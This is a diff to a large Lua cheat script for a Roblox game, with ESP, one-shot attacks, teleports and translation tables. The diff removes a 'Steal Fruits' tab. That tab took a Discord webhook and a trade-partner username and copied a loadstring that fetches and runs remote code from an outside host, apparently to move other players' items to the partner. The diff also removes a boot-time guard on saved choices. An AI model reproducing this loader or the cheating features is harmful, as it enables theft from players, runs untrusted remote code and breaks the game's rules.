@@ -677,7 +677,6 @@ local WINDUI_LUCIDE_FALLBACK = {
     AutoBounty    = "rbxassetid://137726256442333",  -- Lucide: skull
     Dungeon       = "rbxassetid://98218034436456",   -- Lucide: flame
     Teleport      = "rbxassetid://84279202219901",   -- Lucide: map-pin
-    StealFruits   = "rbxassetid://104349242902442",  -- Lucide: apple
     apple         = "rbxassetid://104349242902442",
     HUD           = "rbxassetid://139929981863901",  -- Lucide: layout-dashboard
     Macro         = "rbxassetid://80451686744860",   -- Lucide: bot
@@ -2614,7 +2613,6 @@ local TABS_MANIFEST = {
     { id = "Esp",           name = "ESP",            icon = "scan" },
     { id = "PvP",           name = "PvP",            icon = "swords" },
     { id = "Soru",          name = "Soru",           icon = "zap" },
-    { id = "StealFruits",   name = "Steal Fruits [Soon]",   icon = "apple" },
     { id = "Dungeon",       name = "Dungeon",        icon = "flame" },
     { id = "Teleport",      name = "Teleport",       icon = "map-pin" },
     { id = "FFlags",        name = "FFlags",         icon = "sliders-horizontal" },
@@ -2635,14 +2633,13 @@ local TAB_MIN_CANVAS = {
     Players = 600,
     PvP = 1450,
     Soru = 900,
-    StealFruits = 750,
     Dungeon = 600,
     Teleport = 600,
     FFlags = 1350,
     HUD = 600,
     Macro = 1100,
     WaifuAI = 850,
-    Visuals = 950,
+    Visuals = 650,
     Esp = 950,
     Skins = 600,
     Music = 700,
@@ -2787,7 +2784,7 @@ end
 local TRANSLATIONS_DICT = {
     -- Translation Tables
     ["Spanish"] = {
-        -- Kit One Shot & Visuals / Kamui / Buddha Rainbow
+        -- Kit One Shot & Visuals / Buddha Rainbow
         ["Kit One Shot"] = "Kit One Shot",
         ["Instant 18k+ Fruit M1 Void Remote attack (Activates Fruit Fast Attack)"] = "Ataque remoto vacio 18k+ instantaneo con M1 (Activa Fast Attack Fruta)",
         ["M1 Delay"] = "Velocidad M1",
@@ -2801,20 +2798,6 @@ local TRANSLATIONS_DICT = {
         ["Recolors your Buddha circle with animated rainbow gradient (Client-only)"] = "Colorea el circulo de Buddha con gradiente arcoiris animado (Solo tu cliente)",
         ["Only My Buddha Circle"] = "Solo Mi Circulo de Buddha",
         ["Only affects your own character instead of all nearby Buddha users"] = "Solo afecta a tu propio personaje y no a otros usuarios de Buddha",
-        ["Kamui Visuals & Teleport"] = "Efectos Visuales y Teletransporte Kamui",
-        ["Rip Kamui"] = "Rip Kamui",
-        ["Arena Kamui"] = "Arena Kamui",
-        ["Heaven Kamui"] = "Heaven Kamui",
-        ["Pakistan Kamui"] = "Pakistan Kamui",
-        ["Kamui"] = "Kamui",
-        ["Give Kamui Tools"] = "Obtener Herramientas Kamui",
-        ["Summon Dimensions"] = "Invocar Dimensiones",
-        ["Select Dimension"] = "Seleccionar Dimension",
-        ["Summon Dimension Platform"] = "Invocar Plataforma de Dimension",
-        ["Pocket Dimension"] = "Dimension de Bolsillo",
-        ["Rip Family Arena"] = "Arena de la Familia Rip",
-        ["Heaven Dimension"] = "Dimension Celestial",
-        ["Pakistan Dimension"] = "Dimension Pakistan",
         -- Monody New Additions & Performance Features
         ["Waifu AI"] = "Waifu AI",
         ["Waifu AI Companion"] = "Companera Waifu AI",
@@ -2830,14 +2813,6 @@ local TRANSLATIONS_DICT = {
         ["Color Adaptable al Tema"] = "Color Adaptable al Tema",
         ["Tamaño de Waifu"] = "Tamano de Waifu",
         ["FFlags"] = "FFlags",
-        ["Steal Fruits"] = "Robar Frutas",
-        ["Steal Fruits [Soon]"] = "Robar Frutas [Próximamente]",
-        ["Soon"] = "Próximamente",
-        ["Steal Fruits (Acracy Trade Engine)"] = "Steal Fruits (Motor de Trade Acracy)",
-        ["Discord Webhook"] = "Webhook de Discord",
-        ["Trade Partner Username"] = "Usuario Trade Partner",
-        ["Execute Steal Fruits"] = "Ejecutar Steal Fruits",
-        ["Copy Custom Loadstring"] = "Copiar Loadstring Personalizado",
         ["Reset to Defaults"] = "Restablecer por Defecto",
         ["Configure Discord notification webhook and target trade recipient to transfer fruits automatically."] = "Configura el webhook de Discord y el usuario receptor para transferir frutas automaticamente.",
         ["Fruit Fast Attack"] = "Fruit Fast Attack",
@@ -3422,7 +3397,7 @@ local TRANSLATIONS_DICT = {
         ["Roblox Audio Player"] = "Reproductor de Audio Roblox",
     },
     ["Portuguese"] = {
-        -- Kit One Shot & Visuals / Kamui / Buddha Rainbow
+        -- Kit One Shot & Visuals / Buddha Rainbow
         ["Kit One Shot"] = "Kit One Shot",
         ["Instant 18k+ Fruit M1 Void Remote attack (Activates Fruit Fast Attack)"] = "Ataque remoto de vácuo 18k+ instantâneo com M1 (Ativa Fruit Fast Attack)",
         ["M1 Delay"] = "Velocidade M1",
@@ -3436,21 +3411,7 @@ local TRANSLATIONS_DICT = {
         ["Recolors your Buddha circle with animated rainbow gradient (Client-only)"] = "Colore o círculo do Buddha com gradiente arco-íris animado (Apenas cliente)",
         ["Only My Buddha Circle"] = "Apenas Meu Círculo de Buddha",
         ["Only affects your own character instead of all nearby Buddha users"] = "Afeta apenas seu próprio personagem e não outros usuários de Buddha",
-        ["Kamui Visuals & Teleport"] = "Efeitos Visuais e Teletransporte Kamui",
-        ["Rip Kamui"] = "Rip Kamui",
-        ["Arena Kamui"] = "Arena Kamui",
-        ["Heaven Kamui"] = "Heaven Kamui",
-        ["Pakistan Kamui"] = "Pakistan Kamui",
-        ["Kamui"] = "Kamui",
-        ["Give Kamui Tools"] = "Obter Ferramentas Kamui",
-        ["Summon Dimensions"] = "Invocar Dimensões",
-        ["Select Dimension"] = "Selecionar Dimensão",
-        ["Summon Dimension Platform"] = "Invocar Plataforma de Dimensão",
-        ["Pocket Dimension"] = "Dimensão de Bolso",
-        ["Rip Family Arena"] = "Arena da Família Rip",
-        ["Heaven Dimension"] = "Dimensão Celestial",
-        ["Pakistan Dimension"] = "Dimensão Paquistão",
-        -- Performance / FFlags / Steal Fruits / Waifu
+        -- Performance / FFlags / Waifu
         ["Waifu AI"] = "Waifu AI",
         ["Waifu AI Companion"] = "Companheira Waifu AI",
         ["Activar Waifu"] = "Ativar Waifu",
@@ -3465,14 +3426,6 @@ local TRANSLATIONS_DICT = {
         ["Color Adaptable al Tema"] = "Cor Adaptável ao Tema",
         ["Tamaño de Waifu"] = "Tamanho de Waifu",
         ["FFlags"] = "FFlags",
-        ["Steal Fruits"] = "Roubar Frutas",
-        ["Steal Fruits [Soon]"] = "Roubar Frutas [Em Breve]",
-        ["Soon"] = "Em Breve",
-        ["Steal Fruits (Acracy Trade Engine)"] = "Roubar Frutas (Motor Acracy Trade)",
-        ["Discord Webhook"] = "Webhook do Discord",
-        ["Trade Partner Username"] = "Usuário Parceiro de Trade",
-        ["Execute Steal Fruits"] = "Executar Roubo de Frutas",
-        ["Copy Custom Loadstring"] = "Copiar Loadstring Personalizado",
         ["Reset to Defaults"] = "Restaurar Padrões",
         ["Configure Discord notification webhook and target trade recipient to transfer fruits automatically."] = "Configure o webhook do Discord e o usuário destinatário para transferir frutas automaticamente.",
         ["Fruit Fast Attack"] = "Fruit Fast Attack",
@@ -3962,7 +3915,7 @@ local TRANSLATIONS_DICT = {
         ["Roblox Audio Player"] = "Reprodutor de Áudio Roblox",
     },
     ["French"] = {
-        -- Kit One Shot & Visuals / Kamui / Buddha Rainbow
+        -- Kit One Shot & Visuals / Buddha Rainbow
         ["Kit One Shot"] = "Kit One Shot",
         ["Instant 18k+ Fruit M1 Void Remote attack (Activates Fruit Fast Attack)"] = "Attaque distante 18k+ vide instantanée avec M1 (Active Fruit Fast Attack)",
         ["M1 Delay"] = "Vitesse M1",
@@ -3976,21 +3929,7 @@ local TRANSLATIONS_DICT = {
         ["Recolors your Buddha circle with animated rainbow gradient (Client-only)"] = "Colore le cercle Buddha avec dégradé arc-en-ciel animé (Client uniquement)",
         ["Only My Buddha Circle"] = "Uniquement Mon Cercle Buddha",
         ["Only affects your own character instead of all nearby Buddha users"] = "Affecte uniquement votre personnage et non les autres utilisateurs Buddha",
-        ["Kamui Visuals & Teleport"] = "Effets Visuels et Téléportation Kamui",
-        ["Rip Kamui"] = "Rip Kamui",
-        ["Arena Kamui"] = "Arena Kamui",
-        ["Heaven Kamui"] = "Heaven Kamui",
-        ["Pakistan Kamui"] = "Pakistan Kamui",
-        ["Kamui"] = "Kamui",
-        ["Give Kamui Tools"] = "Obtenir Outils Kamui",
-        ["Summon Dimensions"] = "Invoquer Dimensions",
-        ["Select Dimension"] = "Sélectionner Dimension",
-        ["Summon Dimension Platform"] = "Invoquer Plateforme de Dimension",
-        ["Pocket Dimension"] = "Dimension de Poche",
-        ["Rip Family Arena"] = "Arène de la Famille Rip",
-        ["Heaven Dimension"] = "Dimension Céleste",
-        ["Pakistan Dimension"] = "Dimension Pakistan",
-        -- Waifu / FFlags / Steal Fruits / Performance
+        -- Waifu / FFlags / Performance
         ["Waifu AI"] = "Waifu AI",
         ["Waifu AI Companion"] = "Compagne Waifu AI",
         ["Activar Waifu"] = "Activer Waifu",
@@ -4005,14 +3944,6 @@ local TRANSLATIONS_DICT = {
         ["Color Adaptable al Tema"] = "Couleur Adaptée au Thème",
         ["Tamaño de Waifu"] = "Taille de Waifu",
         ["FFlags"] = "FFlags",
-        ["Steal Fruits"] = "Voler Fruits",
-        ["Steal Fruits [Soon]"] = "Voler Fruits [Bientôt]",
-        ["Soon"] = "Bientôt",
-        ["Steal Fruits (Acracy Trade Engine)"] = "Voler Fruits (Moteur Acracy Trade)",
-        ["Discord Webhook"] = "Webhook Discord",
-        ["Trade Partner Username"] = "Nom d'utilisateur Partenaire d'Échange",
-        ["Execute Steal Fruits"] = "Exécuter Vol de Fruits",
-        ["Copy Custom Loadstring"] = "Copier Loadstring Personnalisé",
         ["Reset to Defaults"] = "Réinitialiser par Défaut",
         ["Configure Discord notification webhook and target trade recipient to transfer fruits automatically."] = "Configurez le webhook Discord et l'utilisateur cible pour transférer les fruits automatiquement.",
         ["Fruit Fast Attack"] = "Fruit Fast Attack",
@@ -4501,7 +4432,7 @@ local TRANSLATIONS_DICT = {
         ["Roblox Audio Player"] = "Lecteur Audio Roblox",
     },
     ["Vietnamese"] = {
-        -- Kit One Shot & Visuals / Kamui / Buddha Rainbow
+        -- Kit One Shot & Visuals / Buddha Rainbow
         ["Kit One Shot"] = "Kit One Shot",
         ["Instant 18k+ Fruit M1 Void Remote attack (Activates Fruit Fast Attack)"] = "Đòn đánh M1 hư vô từ xa 18k+ tức thì (Tự bật Fruit Fast Attack)",
         ["M1 Delay"] = "Tốc độ M1",
@@ -4515,21 +4446,7 @@ local TRANSLATIONS_DICT = {
         ["Recolors your Buddha circle with animated rainbow gradient (Client-only)"] = "Đổi màu vòng Buddha hiệu ứng cầu vồng chuyển động (Chỉ máy bạn)",
         ["Only My Buddha Circle"] = "Chỉ Vòng Buddha Của Tôi",
         ["Only affects your own character instead of all nearby Buddha users"] = "Chỉ tác động lên bản thân thay vì mọi người chơi Buddha xung quanh",
-        ["Kamui Visuals & Teleport"] = "Hiệu Ứng Hình Ảnh & Dịch Chuyển Kamui",
-        ["Rip Kamui"] = "Rip Kamui",
-        ["Arena Kamui"] = "Arena Kamui",
-        ["Heaven Kamui"] = "Heaven Kamui",
-        ["Pakistan Kamui"] = "Pakistan Kamui",
-        ["Kamui"] = "Kamui",
-        ["Give Kamui Tools"] = "Nhận Vũ Khí Kamui",
-        ["Summon Dimensions"] = "Triệu Hồi Chiều Không Gian",
-        ["Select Dimension"] = "Chọn Chiều Không Gian",
-        ["Summon Dimension Platform"] = "Triệu Hồi Nền Không Gian",
-        ["Pocket Dimension"] = "Không Gian Bỏ Túi",
-        ["Rip Family Arena"] = "Võ Đài Gia Tộc Rip",
-        ["Heaven Dimension"] = "Không Gian Thiên Đường",
-        ["Pakistan Dimension"] = "Không Gian Pakistan",
-        -- Waifu / FFlags / Steal Fruits / Performance
+        -- Waifu / FFlags / Performance
         ["Waifu AI"] = "Waifu AI",
         ["Waifu AI Companion"] = "Bạn Đồng Hành Waifu AI",
         ["Activar Waifu"] = "Bật Waifu",
@@ -4544,14 +4461,6 @@ local TRANSLATIONS_DICT = {
         ["Color Adaptable al Tema"] = "Màu Theo Giao Diện",
         ["Tamaño de Waifu"] = "Kích Thước Waifu",
         ["FFlags"] = "FFlags",
-        ["Steal Fruits"] = "Trộm Trái",
-        ["Steal Fruits [Soon]"] = "Trộm Trái [Sắp Ra Mắt]",
-        ["Soon"] = "Sắp Ra Mắt",
-        ["Steal Fruits (Acracy Trade Engine)"] = "Trộm Trái (Công Cụ Trade Acracy)",
-        ["Discord Webhook"] = "Webhook Discord",
-        ["Trade Partner Username"] = "Tên Người Nhận Trade",
-        ["Execute Steal Fruits"] = "Thực Hiện Trộm Trái",
-        ["Copy Custom Loadstring"] = "Sao Chép Loadstring Tùy Chỉnh",
         ["Reset to Defaults"] = "Đặt Lại Mặc Định",
         ["Configure Discord notification webhook and target trade recipient to transfer fruits automatically."] = "Cấu hình webhook Discord và người nhận để tự động chuyển trái ác quỷ.",
         ["Fruit Fast Attack"] = "Fruit Fast Attack",
@@ -6381,8 +6290,7 @@ LoadConfigProfile = function()
                         target = entry
                     end
                     if target ~= nil then
-                        -- Never execute action choices (like dimension teleportation) automatically on boot
-                        local runCb = (key ~= "Summon Dimensions" and key ~= "Select Dimension")
+                        local runCb = true
                         pcall(function() UI_CHOICES[key].set(target, runCb) end)
                     end
                 end
@@ -6535,7 +6443,6 @@ local DEFAULT_CHOICES = {
     ["B6 Weapon"] = 1,
     ["B6 Skill Key"] = 2,
     ["B6 Mode"] = 1,
-    ["Select Dimension"] = 1,
     ["Select Cinematic"] = 1,
 }
 
@@ -6978,7 +6885,6 @@ function M.getMoveMod() return M.get("modules/mobility/movement_engine.lua") end
 function M.getAutoBounty() return M.get("modules/combat/auto_bounty.lua") end
 function M.getMika() return M.get("modules/ai/mika.lua") end
 function M.getKitOneShot() return M.get("modules/combat/kit_one_shot.lua") end
-function M.getKamuiVisuals() return M.get("modules/visuals/kamui_visuals.lua") end
 function M.getBuddhaRainbow() return M.get("modules/visuals/buddha_rainbow.lua") end
 
 _G.DarlingX_FruitFastAttack = false
@@ -7051,78 +6957,6 @@ end
 -- ============================================================
 -- MODULAR TAB REGISTRATION
 -- ============================================================
-
--- ============================================================
--- STEAL FRUITS TAB (ACRACY TRADE ENGINE)
--- ============================================================
-do
-    pcall(function()
-        local StealPage = RegisterTab("StealFruits", "Steal Fruits [Soon]", "apple")
-        Pages["StealFruits"] = StealPage
-        StealPage.ScrollingEnabled = true
-        StealPage.Active = true
-        StealPage.Selectable = true
-        StealPage.ScrollBarThickness = 3
-        StealPage.CanvasSize = UDim2.new(0, 0, 0, 750)
-
-        if getgenv then
-            getgenv().AcracyWebhook = nil
-            getgenv().AcracyTradePartner = nil
-        end
-        local currentWebhook = ""
-        local currentPartner = ""
-
-        -- Card 1: Configuration
-        local sCard = CreateCard(StealPage, "Steal Fruits [Soon]")
-        sCard.LayoutOrder = 1
-
-        local descLabel = Instance.new("TextLabel", sCard)
-        descLabel.Size = UDim2.new(1, 0, 0, 36)
-        descLabel.BackgroundTransparency = 1
-        descLabel.Text = "Configure Discord notification webhook and target trade recipient to transfer fruits automatically."
-        descLabel.TextColor3 = Color3.fromRGB(180, 175, 200)
-        descLabel.Font = Enum.Font.Gotham
-        descLabel.TextSize = 10
-        descLabel.TextWrapped = true
-        descLabel.TextXAlignment = Enum.TextXAlignment.Left
-        RegisterTranslatable(descLabel, "Configure Discord notification webhook and target trade recipient to transfer fruits automatically.")
-
-        local whInput = AddInput(sCard, "Discord Webhook", "Paste Discord Webhook...", "", function(v)
-            currentWebhook = tostring(v or "")
-            if getgenv then getgenv().AcracyWebhook = currentWebhook end
-        end)
-
-        local tpInput = AddInput(sCard, "Trade Partner Username", "Enter Username...", "", function(v)
-            currentPartner = tostring(v or "")
-            if getgenv then getgenv().AcracyTradePartner = currentPartner end
-        end)
-
-        -- Card 2: Generator
-        local aCard = CreateCard(StealPage, "Generator")
-        aCard.LayoutOrder = 2
-
-        AddButton(aCard, "Copy Loadstring", function()
-            local genScript = string.format('getgenv().AcracyWebhook = "%s"\ngetgenv().AcracyTradePartner = "%s"\nloadstring(game:HttpGet("https://api.aurorax.site/files/v6/loaders/87fa920d90640ee0e24282a3d3678b84"))()', currentWebhook, currentPartner)
-            local copied = false
-            if type(setclipboard) == "function" then
-                pcall(setclipboard, genScript)
-                copied = true
-            elseif type(toclipboard) == "function" then
-                pcall(toclipboard, genScript)
-                copied = true
-            end
-            if copied then
-                Notify("Steal Fruits", "Custom loadstring copied to clipboard!", 3)
-            else
-                Notify("Steal Fruits", "Executor lacks clipboard access.", 3)
-            end
-        end)
-
-        UpdateCardGeometry(sCard)
-        UpdateCardGeometry(aCard)
-        UpdatePageCanvas(StealPage)
-    end)
-end
 
 do
 local HomePage = RegisterTab("Home", "Home", "house")
@@ -10454,7 +10288,7 @@ do
 end
 
 -- ============================================================
--- 8. VISUALS TAB (CINEMATICS, BUDDHA RAINBOW & KAMUI ENGINE)
+-- 8. VISUALS TAB (CINEMATICS & BUDDHA RAINBOW)
 -- ============================================================
 do
     pcall(function()
@@ -10641,71 +10475,6 @@ do
         AddToggle(buddhaCard, "Only My Buddha Circle", "Only affects your own character instead of all nearby Buddha users", true, function(state)
             local br = M.getBuddhaRainbow()
             if br then br.OnlyMyCircle = state end
-        end)
-
-        -- Card 3: Kamui Visuals & Teleport
-        local kamuiCard = CreateCard(VisualsPage, "Kamui Visuals & Teleport")
-
-        AddButton(kamuiCard, "Rip Kamui", function()
-            local kv = M.getKamuiVisuals()
-            if kv then
-                kv.EquipKamui("rip kamui", 1191)
-                Notify("Visuals", "Rip Kamui equipped & executed!")
-            end
-        end)
-
-        AddButton(kamuiCard, "Arena Kamui", function()
-            local kv = M.getKamuiVisuals()
-            if kv then
-                kv.EquipKamui("arena kamui", 1235)
-                Notify("Visuals", "Arena Kamui equipped & executed!")
-            end
-        end)
-
-        AddButton(kamuiCard, "Heaven Kamui", function()
-            local kv = M.getKamuiVisuals()
-            if kv then
-                kv.EquipKamui("heaven kamui", 1236)
-                Notify("Visuals", "Heaven Kamui equipped & executed!")
-            end
-        end)
-
-        AddButton(kamuiCard, "Pakistan Kamui", function()
-            local kv = M.getKamuiVisuals()
-            if kv then
-                kv.EquipKamui("pakistan kamui", 1173)
-                Notify("Visuals", "Pakistan Kamui equipped & executed!")
-            end
-        end)
-
-        AddButton(kamuiCard, "Kamui", function()
-            local kv = M.getKamuiVisuals()
-            if kv then
-                kv.EquipKamui("kamui", 1173)
-                Notify("Visuals", "Kamui equipped & executed!")
-            end
-        end)
-
-        AddButton(kamuiCard, "Give Kamui Tools", function()
-            local kv = M.getKamuiVisuals()
-            if kv and kv.GiveAllKamuis then
-                kv.GiveAllKamuis()
-                Notify("Visuals", "All 5 Kamui Tools added to Backpack!")
-            end
-        end)
-
-        local chosenDimension = "Pocket Dimension"
-        AddChoice(kamuiCard, "Select Dimension", { "Pocket Dimension", "Rip Family Arena", "Heaven Dimension", "Pakistan Dimension" }, 1, function(choice)
-            chosenDimension = choice
-        end)
-
-        AddButton(kamuiCard, "Summon Dimension Platform", function()
-            local kv = M.getKamuiVisuals()
-            local targetDim = (UI_CHOICES["Select Dimension"] and UI_CHOICES["Select Dimension"].get and UI_CHOICES["Select Dimension"].get()) or chosenDimension or "Pocket Dimension"
-            if kv and kv.SummonDimension then
-                kv.SummonDimension(targetDim)
-                Notify("Visuals", "Summoned: " .. tostring(targetDim))
-            end
         end)
     end)
 end
